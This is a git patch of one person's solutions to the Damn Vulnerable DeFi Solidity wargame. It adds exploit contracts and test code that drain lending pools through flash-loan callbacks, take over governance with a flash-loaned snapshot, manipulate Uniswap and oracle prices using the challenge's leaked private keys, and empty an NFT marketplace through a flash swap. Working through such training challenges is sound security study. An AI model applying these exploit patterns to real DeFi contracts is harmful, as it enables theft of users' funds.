@@ -1,0 +1,1156 @@
+From 18c0335389a90adbf0ff29506fb02d0189808dbf Mon Sep 17 00:00:00 2001
+From: Oleksandr Koval <oleksandrkoval@ballastlane.com>
+Date: Sun, 25 Jun 2023 15:39:06 -0500
+Subject: [PATCH] my solutions
+
+---
+ contracts/free-rider/CrackFreeRider.sol       | 152 ++++++++++++++++
+ .../free-rider/FreeRiderNFTMarketplace.sol    |   8 +
+ contracts/free-rider/FreeRiderRecovery.sol    |   5 +
+ contracts/naive-receiver/CrackReceiver.sol    |  55 ++++++
+ contracts/puppet-v2/PuppetV2Pool.sol          |  17 ++
+ contracts/puppet/CrackPuppet.sol              |  52 ++++++
+ contracts/selfie/ExploitSelfiePool.sol        |  52 ++++++
+ .../side-entrance/SideEntranceLenderPool.sol  |   2 +-
+ contracts/side-entrance/exploit.sol           |  33 ++++
+ contracts/the-rewarder/Exploit.sol            |  45 +++++
+ contracts/truster/DrainFunds.sol              |  30 +++
+ test/compromised/compromised.challenge.js     |  30 ++-
+ test/free-rider/free-rider.challenge.js       |  92 +++++++++-
+ .../naive-receiver.challenge.js               |   4 +
+ test/puppet-v2/puppet-v2.challenge.js         |  39 +++-
+ test/puppet/puppet.challenge.js               | 172 +++++++++++++++++-
+ test/selfie/selfie.challenge.js               |  12 ++
+ test/side-entrance/side-entrance.challenge.js |   6 +
+ test/the-rewarder/the-rewarder.challenge.js   |   6 +
+ test/truster/truster.challenge.js             |   6 +
+ test/unstoppable/unstoppable.challenge.js     |   2 +
+ yarn.lock                                     |   6 +-
+ 22 files changed, 817 insertions(+), 9 deletions(-)
+ create mode 100644 contracts/free-rider/CrackFreeRider.sol
+ create mode 100644 contracts/naive-receiver/CrackReceiver.sol
+ create mode 100644 contracts/puppet/CrackPuppet.sol
+ create mode 100644 contracts/selfie/ExploitSelfiePool.sol
+ create mode 100644 contracts/side-entrance/exploit.sol
+ create mode 100644 contracts/the-rewarder/Exploit.sol
+ create mode 100644 contracts/truster/DrainFunds.sol
+
+diff --git a/contracts/free-rider/CrackFreeRider.sol b/contracts/free-rider/CrackFreeRider.sol
+new file mode 100644
+index 0000000..45d3ef4
+--- /dev/null
++++ b/contracts/free-rider/CrackFreeRider.sol
+@@ -0,0 +1,152 @@
++// SPDX-License-Identifier: MIT
++pragma solidity ^0.8.0;
++import "../DamnValuableToken.sol";
++import "../DamnValuableNFT.sol";
++import "../free-rider/FreeRiderNFTMarketplace.sol";
++import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
++import "hardhat/console.sol";
++
++interface IUniswapV2Callee {
++    function uniswapV2Call(
++        address sender,
++        uint amount0,
++        uint amount1,
++        bytes calldata data
++    ) external;
++}
++
++interface IUniswapV2Pair {
++    function swap(
++        uint amount0Out,
++        uint amount1Out,
++        address to,
++        bytes calldata data
++    ) external;
++}
++
++interface IUniswapV2Factory {
++    function getPair(
++        address tokenA,
++        address tokenB
++    ) external view returns (address pair);
++}
++
++contract CrackFreeRider is IUniswapV2Callee, IERC721Receiver {
++
++  uint private constant FLASH_LOAN_AMOUNT = 210 ether;
++  uint private constant NFT_PRICE = 15 ether; 
++  uint private constant HIGHER_PRICE = 30 ether;
++
++  IUniswapV2Factory private immutable factory;
++  IUniswapV2Pair private immutable pair;
++  DamnValuableToken private immutable weth;
++  FreeRiderNFTMarketplace private marketplace;
++  DamnValuableNFT private immutable nft; 
++  address private immutable devsContract;
++  address private immutable player;
++
++  constructor(address _uniswapFactory, address _pair, address _weth, address _nft, address _devsContract) {
++    factory = IUniswapV2Factory(_uniswapFactory);
++    weth = DamnValuableToken(_weth);
++    pair = IUniswapV2Pair(_pair);
++    nft = DamnValuableNFT(_nft);
++    devsContract = _devsContract;
++    player = msg.sender;
++  }
++
++  function hackIt(address payable _marketplace) external {
++    marketplace = FreeRiderNFTMarketplace(_marketplace);
++    //take flash loan
++    _takeFlashLoan();
++  }
++
++  function _takeFlashLoan() private {
++    //borrow 210 ETH from uniswap
++    bytes memory data = abi.encode(address(weth), msg.sender);
++    pair.swap(FLASH_LOAN_AMOUNT, 0, address(this), data);
++  }
++
++  function convertFixedToArray(uint256[6] memory fixedArray) internal pure returns (uint256[] memory) {
++    uint256[] memory dynamicArray = new uint256[](6);
++    for (uint i = 0; i < 6; i++) {
++      dynamicArray[i] = fixedArray[i];
++    }
++
++    return dynamicArray;
++  }
++
++
++  function _doArbitrage() private {
++    uint wethBalance = weth.balanceOf(address(this));
++    console.log('Contract WETH balance now is %s', wethBalance);
++    address(weth).call(abi.encodeWithSignature("withdraw(uint256)", wethBalance));
++    console.log('Contract ETH balance now is %s', address(this).balance);
++    console.log('Value required is %s', NFT_PRICE * 6);
++    console.log('Address of marketplace (contract): %s', address(marketplace));
++    uint256[6] memory allNfts = [uint256(0), uint256(1), uint256(2), uint256(3), uint256(4), uint256(5)];
++    marketplace.buyMany{value: NFT_PRICE * 6}(convertFixedToArray(allNfts));
++
++    address(marketplace).call{value: NFT_PRICE * 4}("");
++    nft.setApprovalForAll(address(marketplace), true);
++    marketplace.offerMany(convertFixedToArray(allNfts), convertFixedToArray([HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE]));
++    marketplace.buyMany{ value: HIGHER_PRICE }(convertFixedToArray(allNfts));
++
++    for (uint tokenId = 0; tokenId < 6; tokenId++) {
++      nft.safeTransferFrom(
++        address(this),
++        devsContract,
++        tokenId,
++        abi.encode(address(this))
++      );
++    }
++  }
++
++  function uniswapV2Call(
++      address sender,
++      uint amount0,
++      uint amount1,
++      bytes calldata data
++  ) external {
++      require(msg.sender == address(pair), "not pair");
++      require(sender == address(this), "not sender");
++
++      (address tokenBorrow, address caller) = abi.decode(data, (address, address));
++
++      // Your custom code would go here. For example, code to arbitrage.
++      require(tokenBorrow == address(weth), "token borrow != WETH");
++
++      _doArbitrage();
++
++      // about 0.3% fee, +1 to round up
++      uint fee = (amount0 * 3) / 997 + 1;
++      uint amountToRepay = amount0 + fee;
++      console.log('Amount0: %s', amount0);
++      console.log('Amount1: %s', amount1);
++      console.log('Fee: %s', fee);
++      console.log('Amount to repay: %s', amountToRepay);
++
++
++      console.log('After arbitrage');
++      console.log('Contract WETH balance is: %s', weth.balanceOf(address(this)));
++      console.log('Contract ETH balance is: %s', address(this).balance);
++      console.log('Sender is: %s', sender);
++      console.log('msg.sender is: %s', msg.sender);
++
++      // Repay
++      address(weth).call{ value: amountToRepay }(abi.encodeWithSignature("deposit()"));
++      weth.transfer(address(pair), amountToRepay);
++      player.call{ value: address(this).balance }("");
++  }
++
++  function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
++      external
++      override
++      returns (bytes4)
++  {
++    console.log('CrackFreeRider received NFT number %s', _tokenId);
++    return IERC721Receiver.onERC721Received.selector;
++  }
++
++  
++  receive() external payable {}
++}
+diff --git a/contracts/free-rider/FreeRiderNFTMarketplace.sol b/contracts/free-rider/FreeRiderNFTMarketplace.sol
+index 3c3286a..7042f67 100644
+--- a/contracts/free-rider/FreeRiderNFTMarketplace.sol
++++ b/contracts/free-rider/FreeRiderNFTMarketplace.sol
+@@ -4,6 +4,7 @@ pragma solidity ^0.8.0;
+ import "@openzeppelin/contracts/utils/Address.sol";
+ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+ import "../DamnValuableNFT.sol";
++import "hardhat/console.sol";
+ 
+ /**
+  * @title FreeRiderNFTMarketplace
+@@ -77,6 +78,7 @@ contract FreeRiderNFTMarketplace is ReentrancyGuard {
+     }
+ 
+     function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
++      console.log('buy Many been called');
+         for (uint256 i = 0; i < tokenIds.length;) {
+             unchecked {
+                 _buyOne(tokenIds[i]);
+@@ -99,6 +101,12 @@ contract FreeRiderNFTMarketplace is ReentrancyGuard {
+         DamnValuableNFT _token = token; // cache for gas savings
+         _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
+ 
++        console.log(
++          "Selling NFT number %s for price %s, contract balancer is %s",
++          tokenId,
++          priceToPay,
++          address(this).balance
++        );
+         // pay seller using cached token
+         payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
+ 
+diff --git a/contracts/free-rider/FreeRiderRecovery.sol b/contracts/free-rider/FreeRiderRecovery.sol
+index bd7b6fa..c2e51f9 100644
+--- a/contracts/free-rider/FreeRiderRecovery.sol
++++ b/contracts/free-rider/FreeRiderRecovery.sol
+@@ -5,6 +5,7 @@ import "@openzeppelin/contracts/utils/Address.sol";
+ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+ import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+ import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
++import "hardhat/console.sol";
+ 
+ /**
+  * @title FreeRiderRecovery
+@@ -30,6 +31,7 @@ contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver {
+         beneficiary = _beneficiary;
+         nft = IERC721(_nft);
+         IERC721(_nft).setApprovalForAll(msg.sender, true);
++        console.log('Recovery constructor called');
+     }
+ 
+     // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
+@@ -39,6 +41,7 @@ contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver {
+         nonReentrant
+         returns (bytes4)
+     {
++        console.log('onERC721Received called');
+         if (msg.sender != address(nft))
+             revert CallerNotNFT();
+ 
+@@ -51,6 +54,8 @@ contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver {
+         if (nft.ownerOf(_tokenId) != address(this))
+             revert StillNotOwningToken(_tokenId);
+ 
++        console.log('Received NFT number %s', _tokenId);
++
+         if (++received == 6) {
+             address recipient = abi.decode(_data, (address));
+             payable(recipient).sendValue(PRIZE);
+diff --git a/contracts/naive-receiver/CrackReceiver.sol b/contracts/naive-receiver/CrackReceiver.sol
+new file mode 100644
+index 0000000..56273d6
+--- /dev/null
++++ b/contracts/naive-receiver/CrackReceiver.sol
+@@ -0,0 +1,55 @@
++// SPDX-License-Identifier: MIT
++
++pragma solidity ^0.8.0;
++
++import "solady/src/utils/SafeTransferLib.sol";
++import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
++import "./NaiveReceiverLenderPool.sol";
++
++/**
++ * @title FlashLoanReceiver
++ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
++ */
++contract CrackReceiver is IERC3156FlashBorrower {
++
++    address payable private pool;
++    IERC3156FlashBorrower private receiver;
++
++    error UnsupportedCurrency();
++
++    constructor(address payable _pool, IERC3156FlashBorrower _receiver) payable {
++        pool = _pool;
++        receiver = _receiver;
++    }
++
++    function onFlashLoan(
++        address,
++        address token,
++        uint256 amount,
++        uint256,
++        bytes calldata data
++    ) external returns (bytes32) {
++        
++        NaiveReceiverLenderPool lenderPool = NaiveReceiverLenderPool(pool);
++        while (address(receiver).balance > 0) {
++          lenderPool.flashLoan(receiver, token, amount, data);
++        }
++
++        // Return funds to pool
++        SafeTransferLib.safeTransferETH(pool, 1 ether);
++
++        return keccak256("ERC3156FlashBorrower.onFlashLoan");
++    }
++
++    function drainFunds() external {
++      NaiveReceiverLenderPool lenderPool = NaiveReceiverLenderPool(pool);
++      address ETH = lenderPool.ETH();
++      while (address(receiver).balance > 0) {
++        lenderPool.flashLoan(receiver, ETH, 0, "0x");
++      }
++    }
++    
++    // Allow deposits of ETH
++    receive() external payable {}
++}
++
+diff --git a/contracts/puppet-v2/PuppetV2Pool.sol b/contracts/puppet-v2/PuppetV2Pool.sol
+index 6583058..71754fb 100644
+--- a/contracts/puppet-v2/PuppetV2Pool.sol
++++ b/contracts/puppet-v2/PuppetV2Pool.sol
+@@ -66,4 +66,21 @@ contract PuppetV2Pool {
+             UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
+         return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
+     }
++
++    function getOracleQuote(uint256 amount) external view returns (uint256) {
++      return _getOracleQuote(amount);
++    }
++
++    function getReservesWETH() external view returns (uint256) {
++        (uint256 reservesWETH, uint256 reservesToken) =
++            UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
++        return reservesWETH;
++    }
++
++    function getReservesToken() external view returns (uint256) {
++        (uint256 reservesWETH, uint256 reservesToken) =
++            UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
++        return reservesToken;
++    }
++
+ }
+diff --git a/contracts/puppet/CrackPuppet.sol b/contracts/puppet/CrackPuppet.sol
+new file mode 100644
+index 0000000..5ac1948
+--- /dev/null
++++ b/contracts/puppet/CrackPuppet.sol
+@@ -0,0 +1,52 @@
++pragma solidity ^0.8.0;
++import "../DamnValuableToken.sol";
++import "./PuppetPool.sol";
++import "@openzeppelin/contracts/utils/Address.sol";
++import "hardhat/console.sol";
++
++interface UniswapExchange {
++  function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
++}
++
++contract CrackPuppet {
++  using Address for address payable;
++  constructor (address _pairAddress, address _token, address _pool, uint256 _deadline, uint8 v, bytes32 r, bytes32 s) payable {
++
++    UniswapExchange uniswapExchange = UniswapExchange(_pairAddress);
++    DamnValuableToken token = DamnValuableToken(_token);
++    PuppetPool lendingPool = PuppetPool(_pool);
++
++    uint playerTokenBalance = token.balanceOf(msg.sender);
++    uint poolBalance = token.balanceOf(_pool);
++    uint deadline = block.timestamp + 1 days;
++    token.permit(
++        msg.sender,
++        address(this),
++        playerTokenBalance,
++        _deadline,
++        v,
++        r,
++        s
++    );
++    console.log("Contract token balance before: %d", token.balanceOf(address(this)));
++    token.transferFrom(msg.sender, address(this), playerTokenBalance);
++    console.log("Contract token balance after: %d", token.balanceOf(address(this)));
++    token.approve(address(uniswapExchange), playerTokenBalance);
++    uniswapExchange.tokenToEthSwapInput(playerTokenBalance, 1, _deadline);
++    uint depositValue = lendingPool.calculateDepositRequired(poolBalance);
++    lendingPool.borrow{value: depositValue}(poolBalance, msg.sender);
++
++    token.transfer(msg.sender, token.balanceOf(address(this))); // send tokens back to hot wallet
++    payable(msg.sender).sendValue(address(this).balance); // send ETH back to hot wallet
++  }
++
++
++  receive() external payable {
++
++  }
++
++  fallback() external payable {
++
++  }
++}
++
+diff --git a/contracts/selfie/ExploitSelfiePool.sol b/contracts/selfie/ExploitSelfiePool.sol
+new file mode 100644
+index 0000000..e483839
+--- /dev/null
++++ b/contracts/selfie/ExploitSelfiePool.sol
+@@ -0,0 +1,52 @@
++// SPDX-License-Identifier: MIT
++pragma solidity ^0.8.0;
++
++import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
++import "./SelfiePool.sol";
++import "./SimpleGovernance.sol";
++import "../DamnValuableTokenSnapshot.sol";
++
++contract ExploitSelfiePool is IERC3156FlashBorrower {
++
++  SelfiePool private immutable pool;
++  DamnValuableTokenSnapshot private immutable token;
++  address private immutable player;
++  uint256 public actionId;
++
++  constructor(address _pool, address _token) {
++    player = msg.sender;
++    pool = SelfiePool(_pool);
++    token = DamnValuableTokenSnapshot(_token);
++  }
++
++  function hackIt() external {
++    //take a max loan
++    require(pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "0x"), "Failed to take flash loan");
++  }
++
++  function onFlashLoan(
++        address initiator,
++        address,
++        uint256 amount,
++        uint256 fee,
++        bytes calldata data
++  ) external returns (bytes32) {
++    //here we have governance tokens
++    // take a shapshot
++    token.snapshot();
++    require(token.balanceOf(address(this)) == amount, "Not enough tokens in contract");
++    uint256 balance = token.getBalanceAtLastSnapshot(address(this));
++    require(balance == amount, "Last snapshot havent recorded balance change");
++    uint256 halfTotalSupply = token.getTotalSupplyAtLastSnapshot() / 2;
++    require(balance > halfTotalSupply, "Not enough governance tokens to queue action");
++
++    // submit emergencyExit
++    SimpleGovernance governance = SimpleGovernance(pool.governance());
++    bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
++    actionId = governance.queueAction(address(pool), 0, data);
++    // approve amount to re-pay flash loan
++    token.approve(address(pool), amount);
++    return keccak256("ERC3156FlashBorrower.onFlashLoan");
++  }
++
++}
+diff --git a/contracts/side-entrance/SideEntranceLenderPool.sol b/contracts/side-entrance/SideEntranceLenderPool.sol
+index f04cc7a..9a7a75e 100644
+--- a/contracts/side-entrance/SideEntranceLenderPool.sol
++++ b/contracts/side-entrance/SideEntranceLenderPool.sol
+@@ -13,7 +13,7 @@ interface IFlashLoanEtherReceiver {
+  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+  */
+ contract SideEntranceLenderPool {
+-    mapping(address => uint256) private balances;
++    mapping(address => uint256) /*private*/public balances;
+ 
+     error RepayFailed();
+ 
+diff --git a/contracts/side-entrance/exploit.sol b/contracts/side-entrance/exploit.sol
+new file mode 100644
+index 0000000..50fb3b4
+--- /dev/null
++++ b/contracts/side-entrance/exploit.sol
+@@ -0,0 +1,33 @@
++// SPDX-License-Identifier: MIT
++
++pragma solidity ^0.8.0;
++import "solady/src/utils/SafeTransferLib.sol";
++
++import './SideEntranceLenderPool.sol';
++
++contract Exploit {
++  address private immutable owner;
++  SideEntranceLenderPool sideEntranceLenderPool;
++
++  constructor() {
++    owner = msg.sender;
++  }
++
++  function drainPool(address pool) external {
++    sideEntranceLenderPool = SideEntranceLenderPool(pool);
++    sideEntranceLenderPool.flashLoan(pool.balance);
++  }
++
++  function execute() external payable {
++    sideEntranceLenderPool.deposit{value: msg.value}();
++  }
++
++  function withdraw() external {
++    sideEntranceLenderPool.withdraw();
++    SafeTransferLib.safeTransferETH(owner, address(this).balance);
++  }
++
++  fallback() external payable {
++
++  }
++}
+diff --git a/contracts/the-rewarder/Exploit.sol b/contracts/the-rewarder/Exploit.sol
+new file mode 100644
+index 0000000..f456ef1
+--- /dev/null
++++ b/contracts/the-rewarder/Exploit.sol
+@@ -0,0 +1,45 @@
++// SPDX-License-Identifier: MIT
++
++pragma solidity ^0.8.0;
++
++import "./FlashLoanerPool.sol";
++import "./TheRewarderPool.sol";
++import "solady/src/utils/SafeTransferLib.sol";
++import "@openzeppelin/contracts/interfaces/IERC20.sol";
++
++contract ExploitTheRewarder {
++  address private immutable owner;
++  FlashLoanerPool private immutable flashLoanerPool;
++  IERC20 private immutable liquidityToken;
++  TheRewarderPool private immutable rewarderPool;
++
++  constructor(address _flashLoanerPool, address _liquidityToken, address _rewarderPool) {
++    owner = msg.sender;
++    flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
++    liquidityToken = IERC20(_liquidityToken);
++    rewarderPool = TheRewarderPool(_rewarderPool);
++  }
++
++  function hackIt() external {
++    //take maximal possible flash loan
++    flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));
++  }
++
++  function receiveFlashLoan(uint256 amount) external {
++    require(msg.sender == address(flashLoanerPool), "Could be called only from pool");
++    require(liquidityToken.balanceOf(address(this)) == amount, "Contract dont have liquidity to deposit");
++    //approve spending
++    liquidityToken.approve(address(rewarderPool), amount);
++    // deposit tokens before snapshot
++    rewarderPool.deposit(amount);
++    // withdraw tokens
++    rewarderPool.withdraw(amount);
++    //repay flash loan
++    SafeTransferLib.safeTransfer(address(liquidityToken), address(flashLoanerPool), amount);
++  }
++
++  function claimRewards(address rewardToken) external {
++    IERC20 rewardTokenContract = IERC20(rewardToken);
++    rewardTokenContract.transfer(owner, rewardTokenContract.balanceOf(address(this)));
++  }
++}
+diff --git a/contracts/truster/DrainFunds.sol b/contracts/truster/DrainFunds.sol
+new file mode 100644
+index 0000000..2b6f1bf
+--- /dev/null
++++ b/contracts/truster/DrainFunds.sol
+@@ -0,0 +1,30 @@
++// SPDX-License-Identifier: MIT
++
++pragma solidity ^0.8.0;
++
++import './TrusterLenderPool.sol';
++import "@openzeppelin/contracts/utils/Address.sol";
++import "@openzeppelin/contracts/interfaces/IERC20.sol";
++import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
++
++contract DrainFunds {
++  using SafeERC20 for IERC20;
++  using Address for address;
++
++  address private immutable token;
++  address private immutable pool;
++
++  constructor(address _pool, address _token) {
++    token = _token;
++    pool = _pool;
++  }
++
++  function drain() external {
++    TrusterLenderPool poolContract = TrusterLenderPool(pool);
++    IERC20 tokenContract = IERC20(token);
++    uint256 balance = tokenContract.balanceOf(pool);
++    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", msg.sender, type(uint256).max);
++    poolContract.flashLoan(0, msg.sender, token, data);
++    tokenContract.safeTransferFrom(pool, msg.sender, balance);
++  }
++}
+diff --git a/test/compromised/compromised.challenge.js b/test/compromised/compromised.challenge.js
+index 0c36aab..82e350e 100644
+--- a/test/compromised/compromised.challenge.js
++++ b/test/compromised/compromised.challenge.js
+@@ -1,5 +1,5 @@
+ const { expect } = require('chai');
+-const { ethers } = require('hardhat');
++const { ethers, BigNumber } = require('hardhat');
+ const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+ 
+ describe('Compromised challenge', function () {
+@@ -53,6 +53,34 @@ describe('Compromised challenge', function () {
+ 
+     it('Execution', async function () {
+         /** CODE YOUR SOLUTION HERE */
++        // I should buy nfts for lower price and sell for higher price
++        // To do that I should compromise oracles
++      
++        // How to getNFTs - 
++
++        const symbol = await nftToken.symbol();
++        console.log('Symbol is: ', symbol);
++
++        const price = await oracle.getMedianPrice('DVNFT');
++        console.log('Median price for DVNFT is: ', price);
++        const priceXZ = await oracle.getMedianPrice('XZ');
++        console.log('Median price for XZ is: ', priceXZ);
++        //await exchange.buyOne({value: PLAYER_INITIAL_ETH_BALANCE});
++        const oracleA = new ethers.Wallet('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', ethers.provider);
++        const oracleB = new ethers.Wallet('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48', ethers.provider);
++        const SPECIAL_PRICE = 1;
++        await oracle.connect(oracleA).postPrice('DVNFT', SPECIAL_PRICE);
++        await oracle.connect(oracleB).postPrice('DVNFT', SPECIAL_PRICE);
++        const priceUpdated = await oracle.getMedianPrice('DVNFT');
++        console.log('Median price for DVNFT is: ', priceUpdated);
++        //const id = 0;
++        const id = await exchange.connect(player).buyOne({ value: ethers.utils.parseUnits("10", 16) });//({ value: '0x38D7EA4C68000' });
++        await oracle.connect(oracleA).postPrice('DVNFT', INITIAL_NFT_PRICE);
++        await oracle.connect(oracleB).postPrice('DVNFT', INITIAL_NFT_PRICE);
++        const priceFinal = await oracle.getMedianPrice('DVNFT');
++        console.log('Median price for DVNFT is: ', priceFinal);
++        await exchange.connect(player).sellOne(id);
++
+     });
+ 
+     after(async function () {
+diff --git a/test/free-rider/free-rider.challenge.js b/test/free-rider/free-rider.challenge.js
+index 3c9c2fc..f391847 100644
+--- a/test/free-rider/free-rider.challenge.js
++++ b/test/free-rider/free-rider.challenge.js
+@@ -7,6 +7,7 @@ const { ethers } = require('hardhat');
+ const { expect } = require('chai');
+ const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+ 
++
+ describe('[Challenge] Free Rider', function () {
+     let deployer, player, devs;
+     let weth, token, uniswapFactory, uniswapRouter, uniswapPair, marketplace, nft, devsContract;
+@@ -104,8 +105,97 @@ describe('[Challenge] Free Rider', function () {
+         );
+     });
+ 
++    it('reseatch', async function () {
++      async function research() {
++        // the target is to drain all eth from marketplace contract
++        const HIGHER_PRICE = NFT_PRICE + MARKETPLACE_INITIAL_ETH_BALANCE / 6n;
++        //simulate flash loan
++        const FLASH_LOAN_AMOUNT = NFT_PRICE * 6n * 2n + HIGHER_PRICE + 1n * 10n ** 18n;
++        
++
++        //setBalance(player.address, FLASH_LOAN_AMOUNT);
++        // second buying all nfts
++        console.log('Player`s ballance before:',  await ethers.provider.getBalance(player.address));
++        await marketplace.connect(player).buyMany([0, 1, 2, 3, 4, 5], {value: NFT_PRICE * 6n});
++        console.log('Player`s balance after buying all NFTs:',  await ethers.provider.getBalance(player.address));
++        await player.sendTransaction({
++          to: marketplace.address,
++          value: NFT_PRICE * 4n
++        });
++
++          for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
++              expect(await nft.ownerOf(tokenId)).to.be.eq(player.address);
++          }
++
++        console.log('Now all NFTs are owned by player');
++        
++
++        await nft.connect(player).setApprovalForAll(marketplace.address, true);
++        console.log('Approval is set');
++
++
++        await marketplace.connect(player).offerMany([0, 1, 2, 3, 4, 5], [HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE, HIGHER_PRICE]);
++        console.log('NFTs are offered');
++        console.log('Player`s balance before buyback: ',  await ethers.provider.getBalance(player.address));
++        console.log('Marketplace balance: ', await ethers.provider.getBalance(marketplace.address));
++        console.log(`Higher price: ${HIGHER_PRICE}`);
++        await marketplace.connect(player).buyMany([0, 1, 2, 3, 4, 5], {value: HIGHER_PRICE });
++
++        console.log('Player`s after buying all NFT`s with higher price: ',  await ethers.provider.getBalance(player.address));
++
++        const playerBalance = await ethers.provider.getBalance(player.address);
++        console.log('Player`s ballance after: ',  playerBalance);
++        console.log('Marketplace ballance after: ',  await ethers.provider.getBalance(marketplace.address));
++        console.log(`Player have gained ${playerBalance - Number(FLASH_LOAN_AMOUNT)}`);
++        //player can gain additional 90 ETH - the full balance of marketplace contract
++        // and also 45 ETH bounty - total additional 135 ETH to re-pay flash loan
++        // third - offering nfts with higher NFT_PRICE
++        // fourth - re-paying flash loan
++        // 
++        // transfer all tokens to dev contract
++        const abi = [
++          "function safeTransferFrom(address, address, uint256, bytes) public payable"
++        ];
++        const NFTContract = new ethers.Contract(nft.address, abi, player);
++        
++        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
++            
++            await NFTContract.safeTransferFrom(
++              player.address,
++              devsContract.address,
++              tokenId,
++              ethers.utils.defaultAbiCoder.encode([ "address" ], [ player.address ])
++            );
++            expect(await nft.ownerOf(tokenId)).to.be.eq(devsContract.address);
++        }
++
++        console.log('All NFTs been transferred to devsContract');
++
++      }
++    });
++
++    
++
+     it('Execution', async function () {
+-        /** CODE YOUR SOLUTION HERE */
++      /** CODE YOUR SOLUTION HERE */
++      
++      // first taking flash loan from Uniswap pool - skip for now
++      // minimal amount is NFT_PRICE * 6n
++      // take a flashloan of 90 ETH
++
++      const crackContract = await (await ethers.getContractFactory('CrackFreeRider', player)).deploy(
++          uniswapFactory.address,
++          uniswapPair.address,
++          weth.address,
++          nft.address,
++          devsContract.address
++      );
++
++      console.log('Address of marketplace(test): ', marketplace.address);
++      console.log('Address of player(test): ', player.address);
++      await crackContract.hackIt(marketplace.address);
++      console.log('Flash loan flow completed');
++      console.log('Players balance is: ', await ethers.provider.getBalance(player.address));
+     });
+ 
+     after(async function () {
+diff --git a/test/naive-receiver/naive-receiver.challenge.js b/test/naive-receiver/naive-receiver.challenge.js
+index fc2144c..4405b49 100644
+--- a/test/naive-receiver/naive-receiver.challenge.js
++++ b/test/naive-receiver/naive-receiver.challenge.js
+@@ -38,6 +38,10 @@ describe('[Challenge] Naive receiver', function () {
+ 
+     it('Execution', async function () {
+         /** CODE YOUR SOLUTION HERE */
++        const ETH = await pool.ETH();
++        const CrackReceiverFactory = await ethers.getContractFactory('CrackReceiver', player);
++        let crackReceiver = await CrackReceiverFactory.deploy(pool.address, receiver.address);
++        await crackReceiver.drainFunds();
+     });
+ 
+     after(async function () {
+diff --git a/test/puppet-v2/puppet-v2.challenge.js b/test/puppet-v2/puppet-v2.challenge.js
+index 971cf76..13ce528 100644
+--- a/test/puppet-v2/puppet-v2.challenge.js
++++ b/test/puppet-v2/puppet-v2.challenge.js
+@@ -82,7 +82,42 @@ describe('[Challenge] Puppet v2', function () {
+     });
+ 
+     it('Execution', async function () {
+-        /** CODE YOUR SOLUTION HERE */
++      let reservesWETH = await lendingPool.getReservesWETH();
++      let reservesToken = await lendingPool.getReservesToken();
++      console.log(`Reserves before: WETH: ${reservesWETH} Token: ${reservesToken}`);
++      const ROUTER = uniswapRouter.address;
++      await token.connect(player).approve(
++        ROUTER,
++        PLAYER_INITIAL_TOKEN_BALANCE 
++      );
++      let result = await uniswapRouter.connect(player)
++            .swapExactTokensForTokens(
++                PLAYER_INITIAL_TOKEN_BALANCE,
++                1,
++                [token.address, weth.address],
++                player.address,
++                (await ethers.provider.getBlock('latest')).timestamp * 2
++            );
++      reservesWETH = await lendingPool.getReservesWETH();
++      reservesToken = await lendingPool.getReservesToken();
++      console.log(`Reserves after: WETH: ${reservesWETH} Token: ${reservesToken}`);
++      let wethValue = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
++      console.log(`WETH deposit required: `, wethValue);
++      let wethBalance = await weth.connect(player).balanceOf(player.address);
++      console.log(`WETH balance of player`, wethBalance);
++      await weth.connect(player).deposit({ value: PLAYER_INITIAL_ETH_BALANCE - 5n*10n**16n });
++      wethBalance = await weth.connect(player).balanceOf(player.address);
++      console.log(`WETH balance of player`, wethBalance);
++      const depositRequired = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
++      console.log(`Deposit required: ${depositRequired}`);
++      if (depositRequired > wethBalance) {
++        console.log('Insufficient balance of WETH');
++      } else {
++        console.log('Player has enough WETH');
++      }
++
++      await weth.connect(player).approve(lendingPool.address, wethBalance);
++      await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
+     });
+ 
+     after(async function () {
+@@ -96,4 +131,4 @@ describe('[Challenge] Puppet v2', function () {
+             await token.balanceOf(player.address)
+         ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
+     });
+-});
+\ No newline at end of file
++});
